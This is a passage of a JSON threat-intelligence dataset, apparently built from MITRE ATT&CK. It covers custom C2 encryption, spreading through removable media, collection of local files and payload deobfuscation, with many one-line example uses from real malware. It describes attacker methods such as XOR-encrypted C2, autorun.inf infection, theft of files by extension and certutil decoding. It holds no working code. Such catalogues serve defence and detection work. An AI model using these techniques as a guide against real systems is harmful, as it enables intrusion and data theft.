    "description": "Adversaries may use a custom cryptographic protocol or algorithm to hide command and control traffic. A simple scheme, such as XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.\n\nCustom encryption schemes may vary in sophistication. Analysis and reverse engineering of malware samples may be enough to discover the algorithm and encryption key used.\n\nSome adversaries may also attempt to implement their own version of a well-known cryptographic algorithm instead of using a known implementation library, which may lead to unintentional errors. (Citation: F-Secure Cosmicduke)",
    "example_uses": [
      "variants reported on in 2014 and 2015 used a simple XOR cipher for C2.",
      "uses FakeTLS to communicate with its C2 server.",
      "uses a customized XOR algorithm to encrypt C2 communications.",
      "encrypts C2 traffic using an XOR/ADD cipher and uses a FakeTLS method.",
      "uses variations of a simple XOR encryption routine for C&C communications.",
      "uses XOR with random keys for its communications.",
      "encodes C2 beacons using XOR.",
      "uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic.",
      "uses a custom encryption algorithm, which consists of XOR and a stream that is similar to the Blum Blum Shub algorithm.",
      "C2 traffic is encrypted using bitwise NOT and XOR operations.",
      "uses custom encryption for C2 using 3DES and RSA.",
      "Some  samples use a custom encryption method for C2 traffic using AES, base64 encoding, and multiple keys.",
      "has used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.",
      "The  C2 channel uses an 11-byte XOR algorithm to hide data.",
      "uses fake Transport Layer Security (TLS) to communicate with its C2 server, encoding data with RC4 encryption.",
      "obfuscates C2 traffic with variable 4-byte XOR keys.",
      "C2 messages are encrypted with custom stream ciphers using six-byte or eight-byte keys.",
      "contains a custom version of the RC4 algorithm that includes a programming error.",
      "encrypts C2 traffic with a custom RC4 variant.",
      "encodes C2 traffic with single-byte XOR keys.",
      "performs XOR encryption.",
      "obfuscates C2 communication using a 1-byte XOR with the key 0xBE.",
      "The original variant of  encrypts C2 traffic using a custom encryption cipher that uses an XOR key of “YHCRA” and bit rotation between each XOR operation.  has also included HTML code in C2 traffic in an apparent attempt to evade detection. Additionally, some variants of  use modified SSL code for communications back to C2 servers, making SSL decryption ineffective.",
      "will use an 8-byte XOR key derived from the string HYF54&%9&jkMCXuiS instead if the DES decoding fails.",
      "uses a custom encryption algorithm on data sent back to the C2 server over HTTP.",
      "The C2 server response to a beacon sent by a variant of  contains a 36-character GUID value that is used as an encryption key for subsequent network communications. Some variants of  use various XOR operations to encrypt C2 data.",
      "encrypts C2 data with a ROR by 3 and an XOR by 0x23.",
      "can encrypt C2 data with a custom technique using MD5, base64-encoding, and RC4.",
      "Before being appended to image files,  commands are encrypted with a key composed of both a hard-coded value and a string contained on that day's tweet. To decrypt the commands, an investigator would need access to the intended malware sample, the day's tweet, and the image file containing the command.",
      "uses an XOR 0x1 loop to encrypt its C2 domain.",
      "performs XOR encryption.",
      "is known to utilize encryption within network protocols.",
      "encrypts C2 content with XOR using a single byte, 0x12.",
      "Several  malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another  malware sample XORs C2 traffic.  malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, evading SSL man-in-the-middle decryption attacks."
    ],
    "id": "T1024",
    "name": "Custom Cryptographic Protocol",
    "similar_words": [
      "Custom Cryptographic Protocol"
    ]
  },
  "attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4": {
    "description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.Mobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",
    "example_uses": [
      "has functionality to copy itself to removable media.",
      "drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.",
      "Part of 's operation involved using  modules to copy itself to air-gapped machines and using files written to USB sticks to transfer data and command traffic.",
      "contains modules to infect USB sticks and spread laterally to other Windows systems the stick is plugged into using autorun functionality.",
      "searches for removable media and duplicates itself onto it.",
      "may have used the  malware to move onto air-gapped networks.  targets removable drives to spread to other systems by modifying the drive to use Autorun to execute or by hiding legitimate document files and copying an executable to the folder with the same name as the legitimate document.",
      "drops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system.",
      "is capable of spreading to USB devices.",
      "selective infector modifies executables stored on removable media as a method of spreading across computers.",
      "uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.",
      "contains modules to infect USB sticks and spread laterally to other Windows systems the stick is plugged into using Autorun functionality.",
      "has used malicious DLLs to spread malware to connected removable USB drives on infected machines.",
      "has used a dropper that employs a worm infection strategy using a removable device to breach a secure network environment.",
      "can propagate via removable media using an autorun.inf file or the CVE-2010-2568 LNK vulnerability.",
      "has used a customized  variant which could spread through USB connections.",
      "drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system it opens autorun.inf and loads the malware.",
      "can be configured to spread via removable drives.",
      "can copy its installer to attached USB storage devices.",
      "can spread across systems by infecting removable media.",
      "actors have mailed USB drives to potential victims containing malware that downloads and installs various backdoors including in some cases for ransomware operations.",
      "can spread itself by infecting other portable executable files on removable drives.",
      "has the ability to use removable drives to spread through compromised networks.",
      "has been spread via infected USB keys.",
      "variants used the Windows AUTORUN feature to spread through USB propagation.",
      "has copied itself to and infected removable drives for propagation.",
      "has attempted to transfer  from an infected USB device by copying an Autorun function to the target machine.",
      "has historically used infected USB media to spread to new victims."
    ],
    "id": "T1091",
    "name": "Replication Through Removable Media",
    "similar_words": [
      "Replication Through Removable Media"
    ]
  },
  "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5": {
    "description": "Adversaries may search local system sources, such as file systems, configuration files, local databases, or virtual machine files, to find files of interest and sensitive data prior to Exfiltration.Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.",
    "example_uses": [
      "can download files off the target system to send back to the server.",
      "collects files with the following extensions: .ppt, .pptx, .pdf, .doc, .docx, .xls, .xlsx, .docm, .rtf, .inp, .xlsm, .csv, .odt, .pps, .vcf and sends them back to the C2 server.",
      "collected complete contents of the 'Pictures' folder from compromised Windows systems.",
      "collects data from the local victim system.",
      "collected data from local victim systems.",
      "collects files from the local system.",
      "can collect data from user directories.",
      "creates a backdoor through which remote attackers can steal system information.",
      "uploads files from a specified directory to the C2 server.",
      "searches the local system and gathers data.",
      "collects local files and information from the victim’s local machine.",
      "steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.",
      "creates a backdoor through which remote attackers can retrieve files.",
      "has collected data from victims' local systems.",
      "can be used to act on (ex: copy, move, etc.) files/directories in a system during (ex: copy files into a staging area before).",
      "creates a backdoor through which remote attackers can obtain data from local systems.",
      "contains a collection of Exfiltration modules that can access data from local files, volumes, and processes.",
      "can upload files from compromised hosts.",
      "scrapes memory for properly formatted payment card data.",
      "has retrieved internal documents from machines inside victim environments, including by using  to stage documents before.",
      "creates a backdoor through which remote attackers can read data from files.",
      "has exfiltrated files stolen from local systems.",
      "will identify Microsoft Office documents on the victim's computer.",
      "can collect data from a local system.",
      "dumps memory from specific processes on a victim system, parses the dumped files, and scrapes them for credit card data.",
      "steals user files from local hard drives with file extensions that match a predefined list.",
      "searches for interesting files (either a default or customized set of file extensions) on the local system.  will scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories.  also collects information stored in the Windows Address Book.",
      "collects user files from the compromised host based on predefined file extensions.",
      "When it first starts,  crawls the victim's local drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.",
      "exfiltrates data collected from the victim mobile device.",
      "searches for files on local drives based on a predefined list of file extensions.",
      "collected and exfiltrated files from the infected system.",
      "malware gathers data from the local victim system.",
      "malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers.  malware RomeoDelta copies specified directories from the victim's machine, then archives and encrypts the directories before uploading to its C2 server.",
      "has used Android backdoors capable of exfiltrating specific files directly from the infected devices.",
      "ran a command to compile an archive of file types of interest from the victim user's directories.",
      "has collected files from a local victim.",
      "gathered information and files from local directories for exfiltration.",
      "has collected Office PDF and HWP documents from its victims.",
      "can transfer files from the victim machine.",
      "can retrieve files from the local file system.",
      "has uploaded files from victims' machines.",
      "uploaded sensitive files information and credentials from a targeted organization for extortion or public release.",
      "has used various tools to steal files from the compromised host.",
      "can use a variety of commands including esentutl.exe to steal sensitive data from Internet Explorer and Microsoft Edge to acquire information that is subsequently exfiltrated.",
      "can collect files from a compromised host.",
      "can collect a variety of information from victim machines.",
      "When it first starts  crawls the victim's local drives and collects documents with the following extensions: .doc .docx .pdf .ppt .pptx and .txt.",
      "has collected data and files from a compromised machine.",
      "can collect data from an infected host.",
      "has collected data and files from a compromised host.",
      "server component can upload local files.",
      "has collected data from a compromised network.",
      "can use its `Get` command to exfiltrate specified files from the compromised system.",
      "can exfiltrate files from the system using a documents collector tool.",
      "searches for interesting files (either a default or customized set of file extensions) on the local system.  will scan the My Recent Documents Desktop Temporary Internet Files and TEMP directories.  also collects information stored in the Windows Address Book.",
      "has the ability to copy files on a compromised host.",
      "has run scripts to collect documents from targeted hosts.",
      "has used a script to gather credentials in files left on disk by OpenSSH backdoors.",
      "can collect data and files from a compromised host.",
      "can use a file monitor to steal specific files from targeted systems.",
      "has the capability to upload collected files to C2.",
      "has stored collected information and discovered processes in a tmp file.",
      "can collect data from a compromised host.",
      "contains a collection of Exfiltration modules that can access data from local files volumes and processes.",
      "During  the threat actors collected files and other data from compromised systems.",
      "retrieves files from the victim system via encrypted commands sent to the web shell.",
      "has searched local system resources to access sensitive documents.",
      "has a module to collect information from the local database.",
      "has collected large numbers of files from compromised network systems for later extraction.",
      "can collect information from a compromised host.",
      "has uploaded files from victim machines.",
      "collected data from the victim's local system including password hashes from the SAM hive in the Registry.",
      "has stolen data from compromised hosts.",
      "has collected data and files from compromised networks.",
      "can collect Microsoft Word documents from the target's file system as well as .txt .doc and .xls files from the Internet Explorer cache.",
      "can upload data from the victim's machine to the C2 server.",
      "has collected files from infected systems and uploaded them to a C2 server.",
      "can send files from the victim machine to C2.",
      "has collected and exfiltrated payment card data from compromised systems.",
      "can collect files and information from a compromised host.",
      "can collect information and files from a compromised host.",
      "collects files with the following extensions: .ppt .pptx .pdf .doc .docx .xls .xlsx .docm .rtf .inp .xlsm .csv .odt .pps .vcf and sends them back to the C2 server.",
      "can capture and compress stolen credentials from the Registry and volume shadow copies.",
      "can collect sensitive NTLM material from a compromised host.",
      "During  threat actors exfiltrated files and directories of interest from the targeted system.",
      "RPC backdoors can upload files from victim machines.",
      "collected information from a compromised host.",
      "can retrieve configuration data from a compromised AD FS server.",
      "can upload files from a compromised host.",
      "has the ability to exfiltrate data including Chrome and Edge browser database files from compromised machines.",
      "has uploaded files and data from a compromised host.",
      "During  the threat actors obtained files and data from the compromised network.",
      "has the ability to collect data from a compromised machine to deliver to the attacker.",
      "can copy files on a compromised host.",
      "can transfer files from a compromised host.",
      "can retrieve information from the infected machine.",
      "has collected data and other information from a compromised host.",
      "has dropped a recent-files stealer plugin to `C:\\Users\\Public\\WinSrcNT\\It11.exe`.",
      "During   used malicious Trojans and DLL files to exfiltrate data from an infected host.",
      "can collect data from the system and can monitor changes in specified directories.",
      "has uploaded files and information from victim machines.",
      "can collect data on a compromised host.",
      "can collect then exfiltrate files from the compromised system.",
      "can read files specified on the local system.",
      "has collected files and data from compromised machines.",
      "can collect data from a compromised host including Windows authentication information.",
      "can upload data and files from a victim's machine.",
      "can collect files passwords and other data from a compromised host.",
      "has collected files and data from a compromised host.",
      "has the ability to collect recent files matching a hardcoded list of extensions prior to exfiltration.",
      "has collected data from local victim systems.",
      "has exfiltrated data from a compromised machine.",
      "can upload files to its C2.",
      "collects contacts and application data from files in Desktop Documents Downloads Dropbox and WeChat folders.",
      "During the   extracted files from compromised networks.",
      "has retrieved internal documents from machines inside victim environments including by using  to stage documents before exfiltration.",
      "has the ability to upload files from a compromised system.",
      "can collect data such as PowerPoint files Word documents Excel files PDF files text files database files and image files from an infected machine.",
      "has the ability to access the file system on a compromised host.",
      "can retrieve files from compromised client machines.",
      "has collected files from victim machines including certificates and cookies.",
      "can collect elements related to credit card data from process memory.",
      "During   collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks.",
      "collects local files and information from the victims local machine.",
      "has collected information from a compromised host.",
      "used a file hunting plugin to collect .txt .pdf .xls or .doc files from the infected host.",
      "has the ability to upload files from victim's machines.",
      "can collect files from a local system.",
      "dumps memory from specific processes on a victim system parses the dumped files and scrapes them for credit card data.",
      "can upload files from infected machines after receiving a command with `uploaddd` in the string.",
      "can be used to act on (ex: copy move etc.) files/directories in a system during (ex: copy files into a staging area before).",
      "can copy files and directories from a compromised host.",
      "can upload logs and other data from a compromised host.",
      "can be used to export events from a specific log.",
      "has the ability to upload files from a compromised host.",
      "can collect files and system information from a compromised host.",
      "can upload files from a victim's machine.",
      "has the ability to upload files from a targeted system.",
      "During  the threat actors collected data from compromised hosts.",
      "can collect files of interest from targeted systems.",
      "can copy files and Registry data from compromised hosts.",
      "can upload files to C2 from victim machines.",
      "steals files with the following extensions: .docx .doc .pptx .ppt .xlsx .xls .rtf and .pdf.",
      "has retrieved iPhone text messages from iTunes phone backup files.",
      "can collect information from an air-gapped host machine.",
      "During  threat actors stole the running configuration and cache data from targeted Ivanti Connect Secure VPNs.",
      "searches the File system for files of interest.",
      "During  the threat actors used  to gather various local system information.",
      "has collected files and other sensitive information from a compromised network.",
      "has collected credit card data using native API functions.",
      "has the ability to exfiltrate documents from infected systems.",
      "has the ability to upload files from an infected device.",
      "During  the threat actors collected data and files from compromised networks.",
      "can upload files from victims' machines.",
      "can exfiltrate files from compromised systems.",
      "can collect host data and specific file types.",
      "has collected data from a compromised host.",
      "has collected information and files from a compromised machine.",
      "has stolen the Active Directory database from targeted environments and used  to extract event log information.",
      "has the capability to upload collected files to a C2.",
      "collects files from the local system that have the following extensions then prepares them for exfiltration: .xls .xlsx .pdf .mdb .rar .zip .doc .docx.",
      "can be used to collect data from local file systems.",
      "can upload files from compromised machines.",
      "has collected various files from the compromised computers.",
      "has collected data from a compromised host prior to exfiltration.",
      "can send a file containing victim system information to C2.",
      "has used a web shell to exfiltrate a ZIP file containing a dump of LSASS memory on a compromised machine.",
      "has the ability to steal documents from the local system including the print spooler queue.",
      "During  the threat actors collected data files and other information from compromised networks.",
      "can collect data from an infected local host.",
      "can gather information from compromised hosts.",
      "can exfiltrate files from the victim machine.",
      "can use a file exfiltration tool to collect recently changed files on a compromised host.",
      "can collect local files from the system .",
      "has exfiltrated internal documents files and other data from compromised hosts.",
      "can collect local data from an infected machine.",
      "can upload files from targeted systems.",
      "has gathered stolen credentials sensitive data such as point-of-sale (POS) and ATM data from a compromised network before exfiltration.",
      "can leverage an exfiltration module to download arbitrary files from compromised machines.",
      "During  the threat actors collected documents from compromised hosts.",
      "has collected data from the local disk of compromised hosts.",
      "collects data from victim machines based on configuration information received from command and control nodes.",
      "gathered data from database and other critical servers in victim environments then used wiping mechanisms as an anti-analysis and anti-forensics mechanism.",
      "can collect data from a compromised host using a stealer module.",
      "captured local Windows security event log data from victim machines using the wevtutil utility to extract contents to an evtx output file.",
      "can collect files from compromised hosts.",
      "includes modules for collecting files from local systems based on a given set of properties and filenames.",
      "records data entered from the local system logon at Winlogon to capture credentials in cleartext.",
      "can identify specific files and folders for follow-on exfiltration.",
      "can gather data from infected systems.",
      "gathers victim system information such as enumerating the volume of a given device or extracting system and security event logs for analysis.",
      "has stolen files from a sensitive file server and the Active Directory database from targeted environments and used  to extract event log information.",
      "gathers information from infected systems such as SSH information from the victim's `.ssh` directory.  collects information from local FileZilla installations and Microsoft Sticky Note.",
      "During  threat actors stole saved cookies and login data from targeted systems.",
      "has used PowerShell to upload files from compromised systems.",
      "has stolen `sitemanager.xml` and `recentservers.xml` from `%APPDATA%\\FileZilla\\` if present.",
      "can upload data and files to the LockBit victim-shaming site."
    ],
    "id": "T1005",
    "name": "Data from Local System",
    "similar_words": [
      "Data from Local System"
    ]
  },
  "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c": {
    "description": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.One such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows copy /b or type command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)(Citation: Sentinel One Tainted Love 2023)Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.(Citation: Volexity PowerDuke November 2016)",
    "example_uses": [
      "malware can decode contents from a payload that was Base64 encoded and write the contents to a file.",
      "drops a Word file containing a Base64-encoded file in it that is read, decoded, and dropped to the disk by the macro.",
      "extracts and decrypts stage 3 malware, which is stored in encrypted resources.",
      "has a function for decrypting data containing C2 configuration information.",
      "One  variant decrypts an archive using an RC4 key, then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value \"0x35\".",
      "decrypts resources needed for targeting the victim.",
      "decodes embedded XOR strings.",
      "concatenates then decompresses multiple resources to load an embedded .Net Framework assembly.",
      "uses an encrypted file to store commands and configuration values.",
      "During execution,  malware deobfuscates and decompresses code that was encoded with Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.",
      "can decrypt, unpack and load a DLL from its resources.",
      "has used  in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has used certutil -decode to decode files on the victim’s machine when dropping .",
      "decrypts code, strings, and commands to use once it's on the victim's machine.",
      "decodes an embedded configuration using XOR.",
      "decrypts and extracts a copy of its main DLL payload when executing.",
      "deobfuscates its code.",
      "decodes Base64 strings and decrypts strings using a custom XOR algorithm.",
      "decodes the configuration data and modules.",
      "uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.",
      "deobfuscates its strings and APIs once its executed.",
      "An  HTTP malware variant decrypts strings using single-byte XOR keys.",
      "decodes strings in the malware using XOR and RC4.",
      "decoded base64-encoded PowerShell commands using a VBS file.",
      "shellcode decrypts and decompresses its RC4-encrypted payload.",
      "An  macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload.",
      "has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.",
      "A  macro has run a PowerShell command to decode file contents.  has also used  to decode base64-encoded files on victims.",
      "downloads encoded payloads and decodes them on the victim.",
      "uses the certutil command to decode a payload file.",
      "decrypts and executes shellcode from a file called Stars.jps.",
      "has been used to decode binaries hidden inside certificate files as Base64 information.",
      "has decoded files received from a C2.",
      "can use Base64 to decode actor-controlled C2 server communications.",
      "has deobfuscated itself before executing its commands.",
      "can decode its second-stage PowerShell script prior to execution.",
      "has decrypted function blocks using a XOR key during runtime to evade detection.",
      "has the ability to decrypt and decode multiple layers of obfuscation.",
      "can use a decryption mechanism to process a user supplied password and allow execution.",
      "has used certutil to download and decode base64 encoded strings and has also devoted a custom section to performing all the components of the deobfuscation process.",
      "has used a custom decryption routine which pulls key and salt values from other artifacts such as a WMI filter or  to decode encrypted PowerShell payloads.",
      "s downloaded data is decrypted using AES.",
      "has used a a 32-byte long multi-XOR key to decode data inside its payload.",
      "has used malware to decrypt encrypted CAB files.",
      "uses the AES algorithm bit shifts in a function called `rotate` and an XOR cipher to decrypt resources required for persistence process guarding and file locking. It also performs this same function on encrypted stack strings and the `head` and `key` sections in the network packet structure used for C2 communications.",
      "will decode malware components that are then dropped to the system.",
      "can decrypt its payload and associated configuration elements using the Rijndael cipher.",
      "can decompress and decrypt DLLs and shellcode.",
      "decrypts its encrypted configuration files prior to execution.",
      "has used a simple XOR operation to decrypt strings.",
      "has the ability to decrypt and decompress its payload to enable code execution.",
      "has the ability to unpack itself into memory using XOR.",
      "uses  to decompress a CAB file into executable content.",
      "can deobfuscate packed binaries in memory.",
      "has decoded and decrypted its stages multiple times using hard-coded keys to deliver the final payload and has decoded its server response hex string using XOR.",
      "can deobfuscate the main backdoor code.",
      "has used Base64 to decode malicious VBS script.",
      "can deobfuscate XOR-encoded shellcode prior to execution.",
      "has decoded malicious VBScripts using Base64.",
      "can decrypt its C2 address upon execution.",
      "has decrypted encrypted strings.",
      "can run upload to decrypt and upload files from storage.",
      "has the ability to decrypt its payload prior to execution.",
      "can decode decrypt and decompress data received in C2 HTTP `POST` requests.",
      "can be decrypted in memory using a Lightweight Encryption Algorithm (LEA)-128 key and decoded using a XOR key.",
      "has decoded malware components that are then dropped to the system.",
      "For  the threat actors used a variety of packers and droppers to decrypt malicious payloads.",
      "listens for specific HTTP query parameters in received communications. If specific parameters match a hard-coded RC4 key is used to decrypt the HTTP query paremter hmacTime. This decrypts to a filename that is then open read encrypted with the same RC4 key base64-encoded written to standard out then passed as a response to the HTTP request.",
      "has the ability to decrypt the loader configuration and payload DLL.",
      "has decrypted a binary blob to start execution.",
      "can use a custom parsing routine to decode the command codes and additional parameters from the C2 before executing them.",
      "has the ability to decrypt load and execute a DLL and its resources.",
      "has decrypted its payload using a hardcoded AES-256 key.",
      "can decrypt its payload via a XOR key.",
      "can be used to decompress a local or remote CAB file into an executable.",
      "will decrypt important strings used for C&C communication.",
      "can deobfuscate C2 server responses and unpack its code on targeted hosts.",
      "uses Python code to deobfuscate base64-encoded strings.",
      "has deobfuscated Base64-encoded shellcode strings prior to loading them.",
      "can decrypt AES-encrypted files downloaded from C2.",
      "The  dropping function can initiate decryption of its config file.",
      "uses an XOR key to decrypt content and uses Base64 to decode the C2 address.",
      "uses a fromCharCode() deobfuscation method to avoid explicitly writing execution commands and to hide its code.",
      "can deobfuscate and re-assemble code strings for execution.",
      "decrypts resources that are loaded into memory and executed.",
      "PowerShell script can decode and decrypt multiple layers of obfuscation leading to the  DLL being loaded into memory.",
      "has decrypted files and payloads using a XOR-based algorithm.",
      "can decode its payload prior to execution.",
      "has the ability to decrypt AES encrypted payloads.",
      "can decode its configuration file to determine C2 protocols.",
      "can RC4 decrypt and Base64 decode C2 commands.",
      "has decoded XOR encoded strings holding its configuration upon execution.",
      "can decrypt downloaded modules prior to execution.",
      "has verified C2 domain ownership by decrypting the TXT record using an embedded RSA public key.",
      "can decrypt files and data.",
      "decompresses ZIP files once on the victim machine.",
      "has decoded strings in the malware using XOR and RC4.",
      "During   used the DUSTPAN loader to decrypt embedded payloads.",
      "has decrypted strings and imports using RC4 during execution.",
      "uses a decode routine combining bit shifting and XOR operations with a variable key that depends on the length of the string that was encoded. If the computation for the variable XOR key turns out to be 0 the default XOR key of 0x1B is used. This routine is also referenced as the `rotate` function in reporting.",
      "has decrypted and dropped the  payload to disk.",
      "has decrypted itself using a single-byte XOR scheme. Additionally  can decrypt its configuration data at runtime.",
      "can decode its encoded PE file prior to execution.",
      "has used XOR and Base64 to decode C2 data.",
      "can decrypt its payload prior to execution.",
      "has used  to decode a string into a cabinet file.",
      "can decrypt its encrypted internal code.",
      "decrypts code strings and commands to use once it's on the victim's machine.",
      "has used AES and XOR to decrypt configuration files and commands.",
      "has decrypted the binary's configuration once the main function was launched.",
      "has the ability to decode hexadecimal and Base64 C2 requests.",
      "can first decrypt with the RC4 algorithm using a hardcoded decryption key before decompressing.",
      "has used the AES256 algorithm with a SHA1 derived key to decrypt exploit code.",
      "has decoded base64-encoded PowerShell JavaScript and VBScript.",
      "can decrypt and load other modules.",
      "can use a stream cipher to decrypt stings used by the malware.",
      "can deobfuscate base64 encoded and RC4 encrypted C2 messages.",
      "can deobfuscate the base64-encoded and AES-encrypted files downloaded from the C2 server.",
      "has been decrypted before execution.",
      "can deobfuscate and write malicious ISO files to disk.",
      "has used openssl to decrypt AES encrypted payload data.  has also used base64 and RC4 with a hardcoded key to deobfuscate data.",
      "can unpack and decrypt its payload prior to execution.",
      "has the ability to decrypt its RC4 encrypted payload for execution.",
      "has used crypto key information stored in the Registry to decrypt Tor clients dropped to disk.",
      "can decrypt its configuration file.",
      "has the ability to decrypt files downloaded from C2.",
      "During the   used 7-Zip to decode their  malware.",
      "has deobfuscated XOR-encoded strings.",
      "decrypts downloaded files before execution.",
      "can use a Base64-encoded AES key to decrypt tasking.",
      "One  variant decrypts an archive using an RC4 key then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value 0x35.",
      "The  loader component can decrypt and decompress the payload.",
      "can decrypt encrypted data strings prior to using them.",
      "can resolve networking APIs from strings that are ADD-encrypted.",
      "has used a self-extracting RAR file to deliver modules to victims. Emotet has also extracted embedded executables from files using hard-coded buffer offsets.",
      "can use XOR 0x45 to decrypt obfuscated code.",
      "has the ability to deobfuscate its payload prior to execution.",
      "can use multiple custom routines to decrypt strings prior to execution.",
      "decrypts strings right after the initial communication but before the authentication process.",
      "has the ability to decode downloaded files prior to execution.",
      "decrypts task and configuration files for execution.",
      "can decompress and copy driver files using `LZCopy`.",
      "decrypts the configuration data using XOR with 25-character keys.",
      "has decrypted and loaded the  DLL into memory once the initial dropper executable is launched.",
      "tools decrypted additional payloads from the C2.  has also decoded base64-encoded source code of a downloader.",
      "can deobfuscate Base64-encoded strings and scripts.",
      "can base64-decode and AES-decrypt downloaded payloads. Versions of  pass encrypted and password-protected code to openssl and then write the payload to the /tmp folder.",
      "has decrypted its strings by applying a XOR operation and a decompression using a custom implemented LZM algorithm.",
      "has decrypted packed DLLs with an XOR key.",
      "has used Google Chrome's decryption and extraction operations.",
      "can unarchive data downloaded from the C2 to obtain the payload and persistence modules.",
      "can decrypt strings with a key either stored in the Registry or hardcoded in the code.",
      "decrypts ciphertext using an XOR cipher and a base64-encoded string.",
      "During execution  malware deobfuscates and decompresses code that was encoded with Metasploits shikata_ga_nai encoder as well as compressed with LZNT1 compression.",
      "can decrypt and load files containing malicious payloads.",
      "has the ability to download unpack and decrypt tar.gz files .",
      "can decrypt strings using the victim's hostname as the key.",
      "has decrypted the password of the C2 server with a simple byte by byte XOR.  also writes both an archive of  and the unzip binary to disk from data embedded within the payload using Visual Studios Resource Manager.",
      "After checking for the existence of two files keyword_parm.txt and parm.txt  XOR decodes and read the contents of the files.",
      "has decompressed its core DLL using shellcode once an impersonated antivirus component was running on a system.",
      "has de-obsfuscated XOR encrypted payloads in WebSocket messages.",
      "has decoded and decrypted the configuration file when executed.",
      "has used a Base64 key to decode its components.",
      "has used a script that decodes a Base64-encoded version of WeaveWorks Scope.",
      "can decrypt its configuration data.",
      "has the ability to use a XOR decryption key to extract C2 server domains and IP addresses.",
      "can decode and decrypt messages received from C2.",
      "can decode encrypted strings to enable execution of commands and payloads.",
      "has the ability to decrypt strings encrypted with the Rijndael symmetric encryption algorithm.",
      "decrypts a downloaded file using AES-128-EBC with a custom delta.",
      "has the ability to combine multiple sections of a binary which were broken up to evade detection into a single .dll prior to execution.",
      "can decompress scripts received from C2.",
      "During  the threat actors deobfuscated encoded PowerShell commands including use of the specific string `'FromBase'+0x40+'String'` in place of `FromBase64String` which is normally used to decode base64.",
      "decodes the initially-downloaded hidden encoded file using OpenSSL.",
      "has the ability to self-extract as a RAR archive.",
      "has decompressed data received from the C2 server.",
      "has used  in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used certutil -decode to decode files on the victims machine when dropping .",
      "installation includes binary code stored in a file located in a hidden directory such as shell.txt that is decrypted then executed.  uses hexadecimal-encoded shellcode payloads during installation that are called via Windows API CallWindowProc() to decode and then execute.",
      "can decrypt data received from a C2 and save to a file.",
      "can decrypt and decode embedded  beacon stage shellcode.",
      "has been decompressed by included shellcode prior to being launched.",
      "has used shellcode within macros to decrypt and manually map DLLs and shellcode into memory at runtime.",
      "has decrypted ELF files with AES.",
      "has used unique per machine passwords to decrypt the orchestrator payload and a hardcoded XOR key to decrypt its communications module.  has also used a unique password to decrypt the file used for its hidden file system.",
      "can decrypt its encrypted internal strings.",
      "can deobfuscate its payload prior to execution.",
      "can deobfuscate strings and files for execution.",
      "can deobfuscate shellcode using a rolling XOR and decrypt metadata from Beacon sessions.",
      "can extract and decrypt downloaded .zip files.",
      "has the ability to decrypt embedded .NET and PE payloads.",
      "has used a custom XOR algorithm to decrypt the payload.",
      "loader can decrypt the backdoor code embedded within the loader or within a legitimate PNG file. A custom XOR cipher or RC4 is used for decryption.",
      "has the ability to decrypt strings using hard-coded AES keys.",
      "can decrypt unpack and load a DLL from its resources or from blobs encrypted with Data Protection API two-key triple DES and variations of the XOR cipher.",
      "uses a cipher to implement a decoding function.",
      "can decrypt its payload using RC4 AES or one-byte XORing.",
      "has scripts that are responsible for deobfuscating additional scripts.",
      "decrypts  which was stored in AES128-CBC encrypted blobs.",
      "has the ability to decode and decrypt downloaded files.",
